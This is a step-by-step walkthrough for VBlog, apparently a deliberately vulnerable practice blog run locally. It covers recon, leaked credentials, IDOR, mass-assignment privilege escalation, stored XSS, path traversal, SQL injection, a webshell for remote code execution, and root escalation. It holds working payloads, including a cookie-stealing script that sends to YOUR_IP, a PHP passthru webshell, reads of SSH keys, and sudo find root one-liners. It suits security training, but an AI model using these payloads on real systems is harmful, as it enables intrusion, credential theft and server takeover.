# VBlog — Walkthrough

> Architecture reference: [arquitecture.md](arquitecture.md)

This guide walks through the full attack chain step by step. Each step tells you **what to do** — in the browser, in the terminal, or in DevTools — and **what to expect**.

---

## Setup

**Terminal:**
```bash
git clone https://github.com/Andonigt04/VBlog.git
cd VBlog
sudo docker compose up --build -d
```

Open your browser and navigate to **http://localhost**. The blog should load.

---

## Phase 0 — Reconnaissance (no account needed)

### Step 1 — Browse the application

Open **http://localhost** in your browser.

- Browse around: read posts, click categories, look at the navigation bar.
- Note: there is a **Login** and **Sign up** button. No admin link is visible.
- Check the page source (right-click → View Page Source or `Ctrl+U`). Look for comments, hidden links, or metadata.

### Step 2 — Enumerate hidden routes

**Terminal:**
```bash
gobuster dir -u http://localhost \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,txt,html \
  -t 50
```

Wait for the scan to finish. You should find:

| Route | Status | Notes |
|---|---|---|
| `/backup` | 200 | Contains credentials |
| `/debug` | 200 | Technology info |
| `/old` | 302 | Redirects to `/` |
| `/internal` | 403 | Forbidden (decoy) |
| `/admin` | 302 | Redirects to `/dashboard` |

### Step 3 — Read the exposed files

**Browser:** Go to **http://localhost/backup**

You will see plaintext credentials:
```
editor_user=editor01
editor_pass=editor01pass
admin_user=adm01
admin_email=adm01@vblog.local
admin_pass=adm01local

host=postgresql
database=vblog
user=vblog_adm
password=uireh34t34
```

**Save these.** You will use them throughout the exercise.

**Browser:** Go to **http://localhost/debug**

You will see a JSON response with the PHP version, database driver, and user count. Note the exact values — they help you craft exploits later.

### Step 4 — Enumerate users via IDOR

The API exposes user data without requiring a login.

**Terminal:**
```bash
# Read user 1
curl http://localhost/api/users/1

# Iterate to find the admin (usually the last seeded user, around id 52)
for i in $(seq 1 55); do
  echo -n "id=$i: "
  curl -s http://localhost/api/users/$i | grep -o '"role":"[^"]*"'
done
```

Or in your **browser**, open **http://localhost/api/users/1** and increment the number in the URL until you find `"role":"admin"`.

**Expected output for the admin user:**
```json
{
  "id": 52,
  "name": "adm01",
  "email": "adm01@vblog.local",
  "role": "admin"
}
```

### Step 5 — Enumerate hidden subdomains

**Terminal:**
```bash
gobuster vhost -u http://localhost \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  --append-domain \
  -t 30
```

You should discover: **dev.vblog.local**

**Add it to your hosts file:**
```bash
echo "127.0.0.1  dev.vblog.local" | sudo tee -a /etc/hosts
```

**Browser:** Open **http://dev.vblog.local**

Explore the three pages:
- `/` — environment overview (framework, DB, PHP version)
- `/api-docs.html` — internal API documentation with endpoint details
- `/logs.html` — application logs showing DB connection strings, API calls, and other traces

> In `/logs.html` you will find the full DB connection string and traces of mass assignment requests — useful hints for the next phases.

---

## Phase 1 — Register and log in

### Step 1 — Create an account

**Browser:** Go to **http://localhost/signup**

Fill in:
- **Username:** `hacker` (or any name you prefer)
- **Password:** `password123`

Click **Create account**. You will be redirected to the home page as a logged-in user.

### Step 2 — Check your session

Open **DevTools** (`F12`) → **Application** tab → **Cookies** → `http://localhost`

You will see a cookie named `laravel_session`. Notice that **HttpOnly is not checked** — this means JavaScript can read this cookie (exploited in Phase 3).

### Step 3 — Find your user ID and role

**Terminal:**
```bash
# Log in and save the session cookie
curl -c /tmp/cookies.txt -X POST http://localhost/api/login \
  -H "Content-Type: application/json" \
  -d '{"email":"hacker@example.com","passkey":"password123"}'

# Check your current user info
curl -b /tmp/cookies.txt http://localhost/api/me
```

**Expected output:**
```json
{"id": 53, "name": "hacker", "email": "...", "role": "user"}
```

Write down your **user ID** (e.g., `53`). You will use it in the next step.

---

## Phase 2 — Privilege Escalation (Mass Assignment)

The update endpoint accepts any fields you send — including `role`. There is no check to prevent a regular user from promoting themselves to admin.

### Step 1 — Escalate to admin

**Terminal** (replace `53` with your actual user ID):
```bash
curl -b /tmp/cookies.txt -X PUT http://localhost/api/update/user/53 \
  -H "Content-Type: application/json" \
  -d '{"role":"admin"}'
```

You can also do this **with Burp Suite**:
1. Open Burp Suite → Proxy → Intercept ON
2. In the browser, go to **http://localhost/profile** and click **Save changes** (any change)
3. In Burp, change the method from `POST` to `PUT`, the URL to `/api/update/user/53`, and replace the body with `{"role":"admin"}`
4. Forward the request

### Step 2 — Verify the escalation

**Terminal:**
```bash
curl -b /tmp/cookies.txt http://localhost/api/me
```

**Expected output:**
```json
{"id": 53, "name": "hacker", "role": "admin"}
```

**Browser:** Refresh the page. You should now see an **Admin** or **Dashboard** link in the navigation.

### Step 3 — Access the admin dashboard

**Browser:** Go to **http://localhost/dashboard**

Even though you just changed your own role via the API, the dashboard lets you in — it only checks that you are authenticated, not that you are actually an admin (Broken Access Control).

You will see lists of all users, posts, and comments on the server.

---

## Phase 3 — Stored XSS + Internal Panel

### Step 1 — Inject a malicious comment

**Browser:** Go to any blog post (click a title on the home page).

Scroll down to the comment form. In the **comment text box**, type:

```html
<script>alert(document.cookie)</script>
```

Click **Post comment**.

**Browser:** Reload the post page. A dialog box will appear showing your session cookie. This confirms the XSS is working.

### Step 2 — Steal a cookie (proof of concept)

To demonstrate real impact, you would send the cookie to an external server. In a lab setting:

**Terminal — start a listener:**
```bash
python3 -m http.server 8888
```

**Browser:** Post a new comment with this payload (replace the IP with your machine's IP):
```html
<script>fetch('http://YOUR_IP:8888/?c='+document.cookie)</script>
```

When any user (including an admin) visits that post, their cookie will be sent to your listener.

**Terminal:** Watch the output — you will see a request like:
```
GET /?c=laravel_session=eyJ... HTTP/1.1
```

That cookie can be used to impersonate the session owner.

### Step 3 — Explore the internal panel

If you haven't done so already, add the subdomain to your hosts file and open it:

**Browser:** Go to **http://dev.vblog.local/logs.html**

Read the logs carefully. You will find:
- The PostgreSQL connection string with credentials
- API call traces, including mass assignment attempts
- Other internal information useful for the remaining phases

---

## Phase 4 — Admin API: Path Traversal and SQL Injection

You need an active admin session. Use the cookie from the terminal or stay logged in via the browser.

### Step 1 — Read server files (Path Traversal)

**Terminal:**
```bash
# Read the application's .env file
curl -b /tmp/cookies.txt \
  "http://localhost/api/admin/file?path=.env"

# Break out of the app directory
curl -b /tmp/cookies.txt \
  "http://localhost/api/admin/file?path=../../etc/passwd"
```

**Browser:** You can also test this directly in the URL bar:
```
http://localhost/api/admin/file?path=../../etc/passwd
```

The response will contain `/etc/passwd` from inside the container — confirming you can read arbitrary files.

Other interesting files to try:
```bash
# Nginx config
curl -b /tmp/cookies.txt "http://localhost/api/admin/file?path=../../etc/nginx/nginx.conf"

# SSH keys (if present)
curl -b /tmp/cookies.txt "http://localhost/api/admin/file?path=../../root/.ssh/id_rsa"
```

### Step 2 — Trigger a SQL error (SQL Injection)

**Terminal:**
```bash
curl -b /tmp/cookies.txt \
  "http://localhost/api/admin/stats?filter='"
```

**Browser:** Open:
```
http://localhost/api/admin/stats?filter='
```

You will see a **500 Internal Server Error** with a PostgreSQL stack trace. This confirms the filter parameter is injected directly into the SQL query.

### Step 3 — Confirm blind injection (time-based)

**Terminal:**
```bash
# This should take at least 3 seconds to respond
curl -b /tmp/cookies.txt \
  "http://localhost/api/admin/stats?filter=%25%27%20AND%20(SELECT%201%20FROM%20pg_sleep(3))%3D1%20AND%20%27%25%27%3D%27"
```

If the response is delayed by ~3 seconds, the injection is confirmed.

### Step 4 — Dump the database with sqlmap

**Terminal:**
```bash
sqlmap -u "http://localhost/api/admin/stats?filter=test" \
  --cookie="laravel_session=PASTE_YOUR_SESSION_COOKIE_HERE" \
  --dbms=postgresql \
  --level=3 --risk=2 \
  --batch \
  --dump -T users
```

This will extract all rows from the `users` table, including password hashes.

---

## Phase 5 — Remote Code Execution via File Upload

The admin upload endpoint saves files with the original filename into a public directory. There is no extension check.

### Step 1 — Create a webshell

**Terminal:**
```bash
echo '<?php passthru(base64_decode($_GET["cmd"])); ?>' > /tmp/shell.php
```

### Step 2 — Upload the webshell

**Terminal:**
```bash
curl -b /tmp/cookies.txt -X POST http://localhost/api/admin/upload \
  -F "file=@/tmp/shell.php;type=image/jpeg"
```

**Expected response:**
```json
{"url": "http://localhost/avatars/shell.php"}
```

### Step 3 — Execute remote commands

The shell accepts commands encoded in base64 via the `cmd` parameter.

**Terminal:**
```bash
# Encode a command
echo -n "id" | base64
# Output: aWQ=

# Run it
curl "http://localhost/avatars/shell.php?cmd=aWQ="
# Output: uid=33(www-data) gid=33(www-data)
```

**Browser:** You can also test in the URL bar:
```
http://localhost/avatars/shell.php?cmd=aWQ=
```

More commands:
```bash
# List /etc
echo -n "ls -la /etc/" | base64
curl "http://localhost/avatars/shell.php?cmd=$(echo -n 'ls -la /etc/' | base64 -w0)"

# Read /etc/passwd
curl "http://localhost/avatars/shell.php?cmd=$(echo -n 'cat /etc/passwd' | base64 -w0)"

# Hostname
curl "http://localhost/avatars/shell.php?cmd=$(echo -n 'hostname' | base64 -w0)"
```

You now have **Remote Code Execution** as `www-data` on the server.

---

## Phase 6 — Escalation to root

### Step 1 — Check sudo privileges

**Terminal:**
```bash
curl "http://localhost/avatars/shell.php?cmd=$(echo -n 'sudo -l' | base64 -w0)"
```

**Expected output:**
```
User www-data may run the following commands on ...:
    (root) NOPASSWD: /usr/bin/find
```

### Step 2 — Exploit via GTFOBins (sudo find)

The `find` binary can execute commands with `-exec`. Since we can run `find` as root with no password, we can execute anything as root.

**Terminal:**
```bash
# Run a command as root and save the output
curl "http://localhost/avatars/shell.php?cmd=$(echo -n 'sudo find . -exec /bin/sh -c "id > /tmp/pwned" \; -quit' | base64 -w0)"

# Read the result
curl "http://localhost/avatars/shell.php?cmd=$(echo -n 'cat /tmp/pwned' | base64 -w0)"
```

**Expected output:**
```
uid=0(root) gid=0(root) groups=0(root)
```

**You have root.**

### Step 3 — Alternative: SUID bash

**Terminal:**
```bash
# Check if rootbash exists
curl "http://localhost/avatars/shell.php?cmd=$(echo -n 'ls -la /tmp/rootbash' | base64 -w0)"

# Execute it with -p (preserve effective UID)
curl "http://localhost/avatars/shell.php?cmd=$(echo -n '/tmp/rootbash -p -c id' | base64 -w0)"
```

**Expected output:**
```
uid=33(www-data) euid=0(root)
```

The effective UID is 0 — root access via the SUID bit.

---

## Full Escalation Chain (Summary)

```
Phase 0 — Recon (anonymous)
  1. Browser: http://localhost → explore the app
  2. gobuster dir → finds /backup, /debug
  3. Browser: http://localhost/backup → editor + admin + DB credentials
  4. curl /api/users/1..55 → IDOR, find admin (id 52)
  5. gobuster vhost → dev.vblog.local
  6. Add to /etc/hosts → http://dev.vblog.local/logs.html

Phase 1 — Register
  1. Browser: http://localhost/signup → create account
  2. curl /api/me → get your user ID and current role

Phase 2 — Admin (Mass Assignment)
  1. PUT /api/update/user/{id} -d '{"role":"admin"}'
  2. curl /api/me → role: admin ✓
  3. Browser: http://localhost/dashboard → access granted

Phase 3 — XSS + Internal Panel
  1. Browser: post <script>alert(document.cookie)</script> as a comment
  2. Reload post → cookie appears in alert
  3. Browser: http://dev.vblog.local/logs.html → DB string + traces

Phase 4 — Admin API
  1. curl /api/admin/file?path=../../etc/passwd → Path Traversal
  2. curl /api/admin/stats?filter=' → SQL error (PostgreSQL)
  3. sqlmap → full users table dump

Phase 5 — RCE
  1. Create shell.php with passthru payload
  2. curl -F file=@shell.php /api/admin/upload → /avatars/shell.php
  3. curl /avatars/shell.php?cmd=<base64(id)> → uid=33(www-data)

Phase 6 — root
  1. shell: sudo -l → NOPASSWD: /usr/bin/find
  2. shell: sudo find . -exec /bin/sh -c 'id > /tmp/pwned' \; -quit
  3. cat /tmp/pwned → uid=0(root) ✓
```
